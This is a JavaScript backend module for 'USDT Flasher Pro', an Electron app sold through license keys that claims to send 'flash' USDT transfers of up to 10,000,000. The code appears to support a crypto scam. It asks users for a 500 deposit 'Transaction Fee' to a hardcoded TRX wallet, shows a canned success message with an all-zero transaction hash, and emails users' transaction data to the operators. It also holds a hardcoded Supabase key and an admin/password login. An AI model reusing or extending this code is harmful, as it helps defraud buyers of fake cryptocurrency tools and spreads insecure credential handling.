const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { app } = require('electron');
const io = require('socket.io-client');
const { createClient } = require('@supabase/supabase-js');
const emailService = require('./email-service');

// Initialize Supabase client
const supabaseUrl = process.env.SUPABASE_URL || 'https://gtjeaazmelddcjwpsxvp.supabase.co';
const supabaseAnonKey = process.env.SUPABASE_ANON_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd0amVhYXptZWxkZGNqd3BzeHZwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDExODIwNjYsImV4cCI6MjA1Njc1ODA2Nn0.sOHQMmnNDzX-YnWmtpg81eVyYBdHKGA9GlT9KH1qch8';
const supabase = createClient(supabaseUrl, supabaseAnonKey);

// Cache data
let licenseKeysCache = [];
let contactInfoCache = null;
let appSettingsCache = null;
let lastFetchTime = {
  licenseKeys: 0,
  contactInfo: 0,
  appSettings: 0
};

// Cache expiration time (in milliseconds)
const CACHE_EXPIRATION = 5 * 60 * 1000; // 5 minutes

// API base URL and Socket.IO server URL
const API_BASE_URL = process.env.API_BASE_URL || 'https://usdtflasherpro.netlify.app/.netlify/functions';
// Fallback API URL (local)
const FALLBACK_API_URL = 'http://localhost:3030';
const SOCKET_SERVER_URL = process.env.SOCKET_SERVER_URL || 'http://localhost:3030';

// Socket.IO client
let socket = null;

// Fallback data (used when API is unavailable)
const fallbackLicenseKeys = [
  {
    id: 1,
    key: 'USDT-ABCD-1234-EFGH-5678',
    status: 'active',
    created_at: '2025-01-15T10:30:00.000Z',
    expires_at: '2026-01-15T10:30:00.000Z',
    user: 'test@gmail.com',
    type: 'demo',
    maxAmount: 30
  },
  {
    id: 2,
    key: 'USDT-IJKL-9012-MNOP-3456',
    status: 'active',
    created_at: '2025-02-20T14:45:00.000Z',
    expires_at: '2026-02-20T14:45:00.000Z',
    user: 'live@gmail.com',
    type: 'live',
    maxAmount: 10000000
  },
  {
    id: 3,
    key: 'YGMI-7B5L-GVUF-SL1Q',
    status: 'active',
    created_at: '2025-03-05T10:00:00.000Z',
    expires_at: '2026-03-05T10:00:00.000Z',
    user: 'live@gmail.com',
    type: 'live',
    maxAmount: 10000000
  }
];

const fallbackContactInfo = {
  primaryPhone: '+447013216​28',
  secondaryPhone: '+14693510740',
  tertiaryPhone: '+91 7823232332',
  email: 'support@usdtflasherpro.com',
  website: 'https://usdtflasherpro.com',
  telegramUsername: '@usdtflasherpro',
  discordServer: 'discord.gg/usdtflasherpro'
};

const fallbackAppSettings = {
  appVersion: '4.8',
  updateChannel: 'stable',
  autoUpdate: true,
  theme: 'dark',
  accentColor: '#00e6b8',
  animationsEnabled: true,
  sessionTimeout: 30,
  requirePasswordOnStartup: true,
  twoFactorAuth: false,
  defaultNetwork: 'trc20',
  demoMaxFlashAmount: 30,
  liveMaxFlashAmount: 10000000,
  defaultDelayDays: 0,
  defaultDelayMinutes: 0,
  debugMode: false,
  logLevel: 'info',
  apiEndpoint: 'https://api.usdtflasherpro.com/v1',
  // Payment settings
  depositAmount: 500,
  transactionFee: 'Transaction Fee',
  walletAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
  // Success modal settings
  successTitle: 'Success',
  successMessage: 'The flash has been sent successfully',
  transactionHash: '000000000000000000000000000000000000'
};

// Get user data directory
const getUserDataPath = () => {
  const userDataPath = app ? app.getPath('userData') : path.join(__dirname, 'data');
  
  // Create directory if it doesn't exist
  if (!fs.existsSync(userDataPath)) {
    fs.mkdirSync(userDataPath, { recursive: true });
  }
  
  return userDataPath;
};

// Cache file paths
const getCacheFilePath = (type) => {
  const userDataPath = getUserDataPath();
  return path.join(userDataPath, `${type}-cache.json`);
};

// Load cache from disk
const loadCacheFromDisk = (type) => {
  try {
    const filePath = getCacheFilePath(type);
    
    if (fs.existsSync(filePath)) {
      const data = fs.readFileSync(filePath, 'utf8');
      return JSON.parse(data);
    }
  } catch (error) {
    console.error(`Error loading ${type} cache from disk:`, error);
  }
  
  return null;
};

// Save cache to disk
const saveCacheToDisk = (type, data) => {
  try {
    const filePath = getCacheFilePath(type);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
  } catch (error) {
    console.error(`Error saving ${type} cache to disk:`, error);
  }
};

// Initialize cache from disk
const initializeCache = () => {
  // Load license keys cache
  const licenseKeysFromDisk = loadCacheFromDisk('licenseKeys');
  if (licenseKeysFromDisk) {
    licenseKeysCache = licenseKeysFromDisk;
  }
  
  // Load contact info cache
  const contactInfoFromDisk = loadCacheFromDisk('contactInfo');
  if (contactInfoFromDisk) {
    contactInfoCache = contactInfoFromDisk;
  }
  
  // Load app settings cache
  const appSettingsFromDisk = loadCacheFromDisk('appSettings');
  if (appSettingsFromDisk) {
    appSettingsCache = appSettingsFromDisk;
  }
};

// Initialize cache
initializeCache();

// Create axios instance with the correct base URL
const apiClient = axios.create({
  baseURL: API_BASE_URL,
  timeout: 10000,
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer dummy-token' // Add a dummy token for now
  }
});

// Create fallback axios instance for local server
const fallbackApiClient = axios.create({
  baseURL: FALLBACK_API_URL,
  timeout: 5000,
  headers: {
    'Content-Type': 'application/json'
  }
});

// API interface
const api = {
  // Fetch license keys from Supabase
  fetchLicenseKeys: async () => {
    try {
      console.log('Fetching license keys from Supabase');
      const { data, error } = await supabase
        .from('license_keys')
        .select('*');
      
      if (error) {
        throw error;
      }
      
      // Transform data to match expected format if needed
      const licenseKeys = data.map(key => ({
        id: key.id,
        key: key.key,
        status: key.status,
        created_at: key.created_at,
        expires_at: key.expires_at,
        user: key.user,
        type: key.type || (key.key.includes('DEMO') ? 'demo' : 'live'),
        maxAmount: key.max_amount || (key.type === 'demo' ? 30 : 10000000)
      }));
      
      console.log('Fetched license keys from Supabase:', licenseKeys);
      
      // Update cache
      licenseKeysCache = licenseKeys;
      lastFetchTime.licenseKeys = Date.now();
      
      // Save to disk
      saveCacheToDisk('licenseKeys', licenseKeys);
      
      return licenseKeys;
    } catch (supabaseError) {
      console.error('Error fetching license keys from Supabase:', supabaseError);
      
      // Try primary API
      try {
        console.log(`Trying primary API for license keys: ${API_BASE_URL}/license-keys`);
        const response = await apiClient.get('/license-keys');
        const licenseKeys = response.data;
        
        // Update cache
        licenseKeysCache = licenseKeys;
        lastFetchTime.licenseKeys = Date.now();
        
        // Save to disk
        saveCacheToDisk('licenseKeys', licenseKeys);
        
        return licenseKeys;
      } catch (primaryError) {
        console.error('Error fetching license keys from primary API:', primaryError);
        
        // Try fallback local server
        try {
          console.log(`Trying fallback server for license keys: ${FALLBACK_API_URL}/license-keys`);
          const fallbackResponse = await fallbackApiClient.get('/license-keys');
          const licenseKeys = fallbackResponse.data;
          
          // Update cache
          licenseKeysCache = licenseKeys;
          lastFetchTime.licenseKeys = Date.now();
          
          // Save to disk
          saveCacheToDisk('licenseKeys', licenseKeys);
          
          return licenseKeys;
        } catch (fallbackError) {
          console.error('Error fetching license keys from fallback server:', fallbackError);
          
          // Return cache if available, otherwise fallback
          return licenseKeysCache.length > 0 ? licenseKeysCache : fallbackLicenseKeys;
        }
      }
    }
  },
  
  // Fetch contact info from API
  fetchContactInfo: async () => {
    try {
      console.log(`Fetching contact info from: ${API_BASE_URL}/contact-info`);
      const response = await apiClient.get('/contact-info');
      const contactInfo = response.data;
      
      // Update cache
      contactInfoCache = contactInfo;
      lastFetchTime.contactInfo = Date.now();
      
      // Save to disk
      saveCacheToDisk('contactInfo', contactInfo);
      
      return contactInfo;
    } catch (primaryError) {
      console.error('Error fetching contact info from primary API:', primaryError);
      
      // Try fallback local server
      try {
        console.log(`Trying fallback server for contact info: ${FALLBACK_API_URL}/contact-info`);
        const fallbackResponse = await fallbackApiClient.get('/contact-info');
        const contactInfo = fallbackResponse.data;
        
        // Update cache
        contactInfoCache = contactInfo;
        lastFetchTime.contactInfo = Date.now();
        
        // Save to disk
        saveCacheToDisk('contactInfo', contactInfo);
        
        return contactInfo;
      } catch (fallbackError) {
        console.error('Error fetching contact info from fallback server:', fallbackError);
        
        // Return cache if available, otherwise fallback
        return contactInfoCache || fallbackContactInfo;
      }
    }
  },
  
  // Fetch app settings from API
  fetchAppSettings: async () => {
    try {
      console.log(`Fetching app settings from: ${API_BASE_URL}/app-settings`);
      const response = await apiClient.get('/app-settings');
      const appSettings = response.data;
      
      // Update cache
      appSettingsCache = appSettings;
      lastFetchTime.appSettings = Date.now();
      
      // Save to disk
      saveCacheToDisk('appSettings', appSettings);
      
      return appSettings;
    } catch (primaryError) {
      console.error('Error fetching app settings from primary API:', primaryError);
      
      // Try fallback local server
      try {
        console.log(`Trying fallback server for app settings: ${FALLBACK_API_URL}/app-settings`);
        const fallbackResponse = await fallbackApiClient.get('/app-settings');
        const appSettings = fallbackResponse.data;
        
        // Update cache
        appSettingsCache = appSettings;
        lastFetchTime.appSettings = Date.now();
        
        // Save to disk
        saveCacheToDisk('appSettings', appSettings);
        
        return appSettings;
      } catch (fallbackError) {
        console.error('Error fetching app settings from fallback server:', fallbackError);
        
        // Return cache if available, otherwise fallback
        return appSettingsCache || fallbackAppSettings;
      }
    }
  }
};

// Connect to Socket.IO server
const connectToSocketServer = () => {
  try {
    console.log(`Connecting to Socket.IO server at ${SOCKET_SERVER_URL}`);
    socket = io(SOCKET_SERVER_URL);
    
    // Handle connection events
    socket.on('connect', () => {
      console.log('Connected to Socket.IO server');
    });
    
    socket.on('disconnect', () => {
      console.log('Disconnected from Socket.IO server');
      // Try to reconnect after a delay
      setTimeout(() => {
        if (socket.disconnected) {
          console.log('Attempting to reconnect to Socket.IO server');
          socket.connect();
        }
      }, 5000);
    });
    
    socket.on('error', (error) => {
      console.error('Socket.IO error:', error);
    });
    
    // Handle data updates
    socket.on('contactInfoUpdate', (contactInfo) => {
      console.log('Received contact info update:', contactInfo);
      contactInfoCache = contactInfo;
      lastFetchTime.contactInfo = Date.now();
      saveCacheToDisk('contactInfo', contactInfo);
    });
    
    socket.on('licenseKeysUpdate', (licenseKeys) => {
      console.log('Received license keys update:', licenseKeys);
      licenseKeysCache = licenseKeys;
      lastFetchTime.licenseKeys = Date.now();
      saveCacheToDisk('licenseKeys', licenseKeys);
    });
    
    socket.on('appSettingsUpdate', (appSettings) => {
      console.log('Received app settings update:', appSettings);
      appSettingsCache = appSettings;
      lastFetchTime.appSettings = Date.now();
      saveCacheToDisk('appSettings', appSettings);
    });
    
    socket.on('initialData', (data) => {
      console.log('Received initial data:', data);
      
      if (data.contactInfo) {
        contactInfoCache = data.contactInfo;
        lastFetchTime.contactInfo = Date.now();
        saveCacheToDisk('contactInfo', data.contactInfo);
      }
      
      if (data.appSettings) {
        appSettingsCache = data.appSettings;
        lastFetchTime.appSettings = Date.now();
        saveCacheToDisk('appSettings', data.appSettings);
      }
    });
  } catch (error) {
    console.error('Error connecting to Socket.IO server:', error);
  }
};

// Start periodic sync and connect to Socket.IO server
const startPeriodicSync = () => {
  // Connect to Socket.IO server
  connectToSocketServer();
  
  // Sync every 5 minutes as a fallback
  setInterval(async () => {
    try {
      await api.fetchLicenseKeys();
      await api.fetchContactInfo();
      await api.fetchAppSettings();
      console.log('Periodic sync completed at', new Date().toISOString());
    } catch (error) {
      console.error('Error during periodic sync:', error);
    }
  }, CACHE_EXPIRATION);
};

// Start periodic sync and Socket.IO connection
startPeriodicSync();

// Database interface
const db = {
  getLicenseKeys: async () => {
    // Check if cache is expired
    if (Date.now() - lastFetchTime.licenseKeys > CACHE_EXPIRATION) {
      return await api.fetchLicenseKeys();
    }
    
    // Return cache if available, otherwise fetch from API
    return licenseKeysCache.length > 0 ? licenseKeysCache : await api.fetchLicenseKeys();
  },
  
  getLicenseKey: async (id) => {
    const licenseKeys = await db.getLicenseKeys();
    return licenseKeys.find(k => k.id === id) || null;
  },
  
  getContactInfo: async () => {
    // Check if cache is expired
    if (Date.now() - lastFetchTime.contactInfo > CACHE_EXPIRATION) {
      return await api.fetchContactInfo();
    }
    
    // Return cache if available, otherwise fetch from API
    return contactInfoCache || await api.fetchContactInfo();
  },
  
  getAppSettings: async () => {
    // Check if cache is expired
    if (Date.now() - lastFetchTime.appSettings > CACHE_EXPIRATION) {
      return await api.fetchAppSettings();
    }
    
    // Return cache if available, otherwise fetch from API
    return appSettingsCache || await api.fetchAppSettings();
  },
  
  getFlashHistory: () => [],
  
  authenticateUser: (email, password) => {
    if (email === 'admin@example.com' && password === 'password') {
      return {
        success: true,
        user: {
          id: 1,
          email: 'admin@example.com',
          displayName: 'Admin User',
          role: 'admin'
        }
      };
    }
    return { success: false, message: 'Invalid email or password' };
  }
};

// License Key functions
async function validateLicenseKey(key) {
  try {
    console.log('Starting license key validation for:', key);
    
    // If socket is connected, use it for real-time validation
    if (socket && socket.connected) {
      return new Promise((resolve, reject) => {
        // Set up a one-time listener for the validation response
        socket.once('licenseKeyValidation', (result) => {
          console.log('Received license key validation response from socket:', result);
          // Email notification will be sent from main.js
          resolve(result);
        });
        
        // Send validation request
        socket.emit('validateLicenseKey', { licenseKey: key });
        console.log('Sent license key validation request to socket');
        
        // Set a timeout in case the server doesn't respond
        setTimeout(() => {
          // Remove the listener to avoid memory leaks
          socket.off('licenseKeyValidation');
          console.log('Socket timeout, falling back to local validation');
          
          // Fall back to local validation
          validateLicenseKeyLocally(key)
            .then(result => {
              console.log('Local validation result:', result);
              // Email notification will be sent from main.js
              resolve(result);
            })
            .catch(reject);
        }, 5000);
      });
    } else {
      console.log('Socket not connected, using local validation');
      // Fall back to local validation if socket is not connected
      const result = await validateLicenseKeyLocally(key);
      console.log('Local validation result:', result);
      
      // Email notification will be sent from main.js
      return result;
    }
  } catch (error) {
    console.error('Error validating license key:', error);
    return { valid: false, message: 'Error validating license key. Please try again.' };
  }
}

// Local license key validation (fallback)
async function validateLicenseKeyLocally(key) {
  try {
    console.log('Validating license key locally:', key);
    
    // Try to get the license key directly from Supabase first
    try {
      console.log('Checking license key in Supabase');
      const { data, error } = await supabase
        .from('license_keys')
        .select('*')
        .eq('key', key)
        .single();
      
      if (error) {
        console.error('Error fetching license key from Supabase:', error);
        throw error;
      }
      
      if (data) {
        console.log('License key found in Supabase:', data);
        
        // Check if license key is active
        if (data.status !== 'active') {
          console.log(`License key is ${data.status}`);
          return { valid: false, message: `License key is ${data.status}` };
        }
        
        // Check if license key has expired
        const expiryDate = new Date(data.expires_at);
        if (expiryDate < new Date()) {
          console.log('License key has expired');
          return { valid: false, message: 'License key has expired' };
        }
        
        // Get app settings for max flash amounts
        const appSettings = await db.getAppSettings();
        
        // Determine license type and user
        const isDemo = data.type === 'demo' || key.includes('DEMO');
        const type = isDemo ? 'demo' : 'live';
        
        // Use max_amount from database if available, otherwise use app settings
        let maxAmount;
        if (data.max_amount !== undefined && data.max_amount !== null) {
          // Use the max_amount from the database
          maxAmount = data.max_amount;
          console.log(`Using max amount from database: ${maxAmount}`);
        } else {
          // Fallback to app settings
          maxAmount = isDemo ? appSettings.demoMaxFlashAmount : appSettings.liveMaxFlashAmount;
          console.log(`Using max amount from app settings: ${maxAmount}`);
        }
        
        // Create license key object with expected format
        const licenseKey = {
          id: data.id,
          key: data.key,
          status: data.status,
          created_at: data.created_at,
          expires_at: data.expires_at,
          user: data.user || (isDemo ? 'test@gmail.com' : 'live@gmail.com'),
          type: type,
          maxAmount: maxAmount
        };
        
        console.log('License key validation successful:', licenseKey);
        
        // Email notification will be sent from main.js
        return { valid: true, licenseKey };
      } else {
        console.log('License key not found in Supabase');
      }
    } catch (supabaseError) {
      console.error('Supabase validation failed, falling back to cached keys:', supabaseError);
      // Continue with fallback validation
    }
    
    // Fallback to cached license keys
    console.log('Falling back to cached license keys');
    const licenseKeys = await db.getLicenseKeys();
    
    // Find the license key
    const licenseKey = licenseKeys.find(license => license.key === key);
    
    if (!licenseKey) {
      return { valid: false, message: 'Invalid license key' };
    }
    
    // Check if license key is active
    if (licenseKey.status !== 'active') {
      return { valid: false, message: `License key is ${licenseKey.status}` };
    }
    
    // Check if license key has expired
    const expiryDate = new Date(licenseKey.expires_at || licenseKey.expiresAt);
    if (expiryDate < new Date()) {
      return { valid: false, message: 'License key has expired' };
    }
    
    // Get app settings for max flash amounts
    const appSettings = await db.getAppSettings();
    
    // Determine license type and user
    const isDemo = licenseKey.type === 'demo' || key.includes('DEMO');
    const user = licenseKey.user || (isDemo ? 'test@gmail.com' : 'live@gmail.com');
    const type = isDemo ? 'demo' : 'live';
    
    // Use max_amount from database if available, otherwise use app settings
    let maxAmount;
    if (licenseKey.max_amount !== undefined && licenseKey.max_amount !== null) {
      // Use the max_amount from the database
      maxAmount = licenseKey.max_amount;
      console.log(`Using max amount from database: ${maxAmount}`);
    } else {
      // Fallback to app settings
      maxAmount = isDemo ? appSettings.demoMaxFlashAmount : appSettings.liveMaxFlashAmount;
      console.log(`Using max amount from app settings: ${maxAmount}`);
    }
    
    // Add license type and user to the response
    licenseKey.type = type;
    licenseKey.user = user;
    licenseKey.maxAmount = maxAmount;
    
    return { valid: true, licenseKey };
  } catch (error) {
    console.error('Error validating license key locally:', error);
    return { valid: false, message: 'Error validating license key. Please try again.' };
  }
}

// Contact Information functions
async function getContactInfo() {
  try {
    return await db.getContactInfo();
  } catch (error) {
    console.error('Error getting contact info:', error);
    throw error;
  }
}

function updateContactInfo(contactData) {
  try {
    // This is not implemented for the desktop app
    return contactData;
  } catch (error) {
    console.error('Error updating contact info:', error);
    throw error;
  }
}

function getContactInfoHistory(limit = 10) {
  try {
    // This is not implemented for the desktop app
    return [];
  } catch (error) {
    console.error('Error getting contact info history:', error);
    return [];
  }
}

// App Settings functions
async function getAppSettings() {
  try {
    return await db.getAppSettings();
  } catch (error) {
    console.error('Error getting app settings:', error);
    throw error;
  }
}

function updateAppSettings(settingsData) {
  try {
    // This is not implemented for the desktop app
    return settingsData;
  } catch (error) {
    console.error('Error updating app settings:', error);
    throw error;
  }
}

// Flash Transaction functions
async function logFlashTransaction(transactionData) {
  try {
    // Send email notification with flash details
    try {
      console.log('Sending flash creation email notification');
      console.log('Flash transaction data:', JSON.stringify(transactionData, null, 2));
      
      // Add a small delay to ensure the console logs are displayed
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Make sure we have a valid email service
      if (!emailService || typeof emailService.sendFlashCreationNotification !== 'function') {
        console.error('Email service not properly initialized');
        console.log('Attempting to re-require email service');
        // Try to re-require the email service
        const freshEmailService = require('./email-service');
        
        // Send the notification
        const emailResult = await freshEmailService.sendFlashCreationNotification(transactionData);
        console.log('Flash creation email notification sent:', emailResult);
      } else {
        // Send the notification using the existing email service
        const emailResult = await emailService.sendFlashCreationNotification(transactionData);
        console.log('Flash creation email notification sent:', emailResult);
      }
    } catch (emailError) {
      console.error('Error sending flash creation email notification:', emailError);
      console.error('Error details:', JSON.stringify(emailError, null, 2));
    }
    
    // For now, we'll just return a success response
    return { success: true, id: Date.now() };
  } catch (error) {
    console.error('Error logging flash transaction:', error);
    return { success: false, error: error.message };
  }
}

function getFlashHistory(licenseKeyId) {
  try {
    return [];
  } catch (error) {
    console.error('Error getting flash history:', error);
    return [];
  }
}

// User Authentication functions
function authenticateUser(email, password) {
  try {
    return db.authenticateUser(email, password);
  } catch (error) {
    console.error('Error authenticating user:', error);
    return { success: false, message: 'Authentication error' };
  }
}

// Force refresh data from API
async function forceRefresh() {
  try {
    await api.fetchLicenseKeys();
    await api.fetchContactInfo();
    await api.fetchAppSettings();
    return { success: true, message: 'Data refreshed successfully' };
  } catch (error) {
    console.error('Error refreshing data:', error);
    return { success: false, message: 'Error refreshing data' };
  }
}

// Export functions
module.exports = {
  validateLicenseKey,
  getLicenseKeys: async () => await db.getLicenseKeys(),
  getLicenseKey: async (id) => await db.getLicenseKey(id),
  getContactInfo,
  updateContactInfo,
  getContactInfoHistory,
  getAppSettings,
  updateAppSettings,
  logFlashTransaction,
  getFlashHistory,
  authenticateUser,
  forceRefresh
};
